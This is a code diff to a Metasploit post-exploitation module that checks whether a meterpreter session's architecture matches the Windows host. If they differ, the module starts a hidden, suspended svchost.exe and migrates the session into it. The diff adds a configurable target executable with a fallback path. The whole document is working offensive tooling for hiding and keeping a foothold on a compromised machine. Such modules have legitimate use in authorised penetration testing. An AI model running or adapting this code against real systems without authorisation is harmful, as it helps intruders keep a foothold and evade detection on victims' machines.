@@ -7,7 +7,7 @@ class MetasploitModule < Msf::Post
 
     def initialize(info={})
         super(update_info(info,
-          'Name'          => 'Architicture Migrate',
+          'Name'          => 'Architecture Migrate',
           'Description'   => %q{This module checks if the meterpreter architecture is the same as the OS architecture and if it's incompatible it spawns a new process with the correct architecture and migrates into that process.},
           'License'       => MSF_LICENSE,
           'Author'        => ['Koen Riepe (koen.riepe@fox-it.com)'],
@@ -16,6 +16,12 @@ class MetasploitModule < Msf::Post
           'Arch'          => [ 'x86', 'x64' ],
           'SessionTypes'  => [ 'meterpreter' ]
         ))
+
+    register_options(
+    [
+      OptString.new('EXE', [true, 'The executable to start and migrate into', 'C:\windows\sysnative\svchost.exe']),
+      OptBool.new('FALLBACK', [ true, 'If the selected migration executable does not exist fallback to a sysnative file', true ])
+    ], self.class)
     end
 
     def is_32_bit_on_64_bits()
@@ -36,9 +42,8 @@ class MetasploitModule < Msf::Post
 
     def run
         if is_32_bit_on_64_bits()
-            print_error("The meterpreter is not the same architecture as the OS! Upgrading!")
-            windir = get_windows_loc()
-            newproc = windir + ':\windows\sysnative\svchost.exe'
+            print_status("The meterpreter is not the same architecture as the OS! Upgrading!")
+            newproc = datastore['EXE']
             if exist?(newproc)
                 print_status("Starting new x64 process #{newproc}")
                 pid = session.sys.process.execute(newproc,nil,{'Hidden' => true,'Suspended' => true}).pid
@@ -49,6 +54,24 @@ class MetasploitModule < Msf::Post
                     print_good("Success!")
                 else
                     print_error("Migration failed!")
+                end
+            else
+                print_error("The selected executable to migrate into does not exist")
+                if datastore['FALLBACK']
+                    windir = get_windows_loc()
+                    newproc = windir + ':\windows\sysnative\svchost.exe'
+                    if exist?(newproc)
+                        print_status("Starting new x64 process #{newproc}")
+                        pid = session.sys.process.execute(newproc,nil,{'Hidden' => true,'Suspended' => true}).pid
+                        print_good("Got pid #{pid}")
+                        print_status("Migrating..")
+                        session.core.migrate(pid)
+                        if pid == session.sys.process.getpid
+                            print_good("Success!")
+                        else
+                            print_error("Migration failed!")
+                        end
+                    end
                 end
             end
         else
